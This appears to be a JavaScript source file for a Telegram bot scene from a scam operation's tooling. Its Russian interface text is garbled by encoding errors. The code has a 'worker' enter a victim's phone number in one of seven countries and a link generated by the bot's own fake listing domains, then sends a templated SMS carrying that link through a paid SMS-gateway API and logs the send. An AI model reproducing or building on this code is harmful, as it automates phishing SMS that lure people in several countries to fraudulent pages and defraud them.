const WizardScene = require("telegraf/scenes/wizard");
const linkify = require("linkifyjs");
const { Markup } = require("telegraf");
const { Service } = require("../database");
const { default: axios } = require("axios");
const escapeHTML = require("escape-html");
const log = require("../helpers/log");
const locale = require("../locale.js");
const instruments = require("../commands/instruments");
const parsePhoneNumber = require("libphonenumber-js");
const config = require("../config/index");

const scene = new WizardScene(
  "send_sms",
  async (ctx) => {
    try {
      // if (ctx.state.user.status == 0) {
      //   await ctx.reply("‚ùå –î–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–º—Å –í—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –ü–†–û –≤–æ—Ä–∫–µ—Ä–æ–º").catch((err) => err);
      //   return ctx.scene.leave();
      // }
      await ctx.scene.reply("üì≤ <b>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</b>", {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")]]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.reply("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();
      var text = ctx.message.text;
      if (text[0] != "+") text = "+" + text;

      var phoneNumber;
      try {
        phoneNumber = parsePhoneNumber(text, "");
        if (phoneNumber == undefined) return ctx.wizard.prevStep();
      } catch (e) {
        return ctx.wizard.prevStep();
      }

      if (
        phoneNumber.country == "AU" ||
        phoneNumber.country == "DE" ||
        phoneNumber.country == "ES" ||
        phoneNumber.country == "IT" ||
        phoneNumber.country == "PL" ||
        phoneNumber.country == "RO" ||
        phoneNumber.country == "GB"
      ) {
        ctx.scene.state.data.country = phoneNumber.country;
        ctx.scene.state.data.number = phoneNumber.number.replace(/\D+/g, "");
        await ctx.scene.reply("üîó <b>–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—ä—è–≤–ª–µ–Ω–∏–µ</b>", {
          reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")]]),
          parse_mode: "HTML",
        });
        return ctx.wizard.next();
      } else {
        await ctx
          .replyOrEdit("‚ùå <b>–í –Ω–∞—Å—Ç–æ—è—â–µ–µ –≤—Ä–µ–º—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å–º—Å –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω —ç—Ç–æ–π —Å—Ç—Ä–∞–Ω—ã –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞</b>", { parse_mode: "HTML" })
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }
    } catch (err) {
      console.log(err);
      ctx.reply("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();

      try {
        new URL(ctx.message.text);
      } catch (err) {
        await ctx.replyOrEdit("‚ùå <b>–í–≤–µ–¥–∏—Ç–µ –≤–∞–ª–∏–¥–Ω—É—é —Å—Å—ã–ª–∫—É</b>", { parse_mode: "HTML" }).catch((err) => err);
        return ctx.wizard.prevStep();
      }

      var url = linkify.find(ctx.message.text).filter((v) => v.type == "url");
      const domains = (await Service.findAll()).map((v) => v.domain);
      var regexp = new RegExp(`(${domains.join("|")})`, "gui");
      if (url.filter((v) => !regexp.test(v.value)).length >= 1) {
        await ctx
          .reply("‚ùå <b>–í—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ç–µ —Å—Å—ã–ª–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ —Å–æ–∑–¥–∞–Ω–Ω—ã –≤ –Ω–∞—à–µ–º –±–æ—Ç–µ</b>", { parse_mode: "HTML" })
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }

      await ctx.scene.reply("<b>–û–∂–∏–¥–∞–π—Ç–µ...</b>", {
        parse_mode: "HTML",
      });

      ctx.scene.state.data.link = url[0].value;
      var templates = await axios.get(`https://sender.getsms.shop/templates?country=${ctx.scene.state.data.country}`);
      templates = templates.data.filter((el) => !el.message.includes("{{order_id}}") || !el.message.includes("{{fio}}"));
      ctx.scene.state.data.templates = templates;

      var text = "üìö <b>–í—ã–±–µ—Ä–∏—Ç–µ —à–∞–±–ª–æ–Ω –Ω–∏–∂–µ –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–≥–æ –Ω–æ–º–µ—Ä:</b>\n";
      for (let i = 0; i < templates.length; i++) {
        text += `\n${i + 1}. ${templates[i].message}`;
      }

      await ctx.scene.reply(text, {
        parse_mode: "HTML",
      });
      return ctx.wizard.next();
    } catch (err) {
      ctx.reply("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) {
        await ctx.replyOrEdit("‚ùå <b>–û—à–∏–±–∫–∞. –í–≤–µ–¥–∏—Ç–µ —Ç–æ–ª—å–∫–æ —á–∏—Å–ª–æ!</b>", { parse_mode: "HTML" }).catch((err) => err);
        return ctx.wizard.prevStep();
      }
      if (parseInt(ctx.message.text) == NaN) {
        await ctx.replyOrEdit("‚ùå <b>–û—à–∏–±–∫–∞. –í–≤–µ–¥–∏—Ç–µ —Ç–æ–ª—å–∫–æ —á–∏—Å–ª–æ!</b>", { parse_mode: "HTML" }).catch((err) => err);
        return ctx.wizard.prevStep();
      }
      if (parseInt(ctx.message.text) > ctx.scene.state.data.templates.length - 1 || parseInt(ctx.message.text) <= 0) {
        await ctx.replyOrEdit("‚ùå <b>–û—à–∏–±–∫–∞. –¢–∞–∫–æ–≥–æ —à–∞–±–ª–æ–Ω–∞ –Ω–µ—Ç!</b>", { parse_mode: "HTML" }).catch((err) => err);
        return ctx.wizard.prevStep();
      }
      const templateNumber = parseInt(ctx.message.text) - 1;

      await ctx.scene.reply("‚è≥ <b>–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –°–ú–°...</b>", {
        parse_mode: "HTML",
      });

      const result = await axios.get(
        `https://sender.getsms.shop/send?key=${config.SMS_TOKEN}&number=${ctx.scene.state.data.number}&template_id=${ctx.scene.state.data.templates[templateNumber].id}&link=${ctx.scene.state.data.link}`
      );

      if (result.data.ok !== true) {
        await ctx.scene.reply("‚ùå <b>–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –°–ú–°!</b>", { parse_mode: "HTML" }).catch((err) => err);
      } else {
        await ctx.scene.reply("‚úÖ <b>–°–ú–° –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!</b>", { parse_mode: "HTML" }).catch((err) => err);
        await log(ctx, `–û—Ç–ø—Ä–∞–≤–∏–ª –°–ú–° –Ω–∞ –Ω–æ–º–µ—Ä +${ctx.scene.state.data.number} —Å —Å—Å—ã–ª–∫–æ–π ${ctx.scene.state.data.link}`);
      }
    } catch (err) {
      console.log(err);
      ctx.reply("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
    return ctx.scene.leave();
  }
);

// encodeURI(text)

scene.leave(instruments);

module.exports = scene;
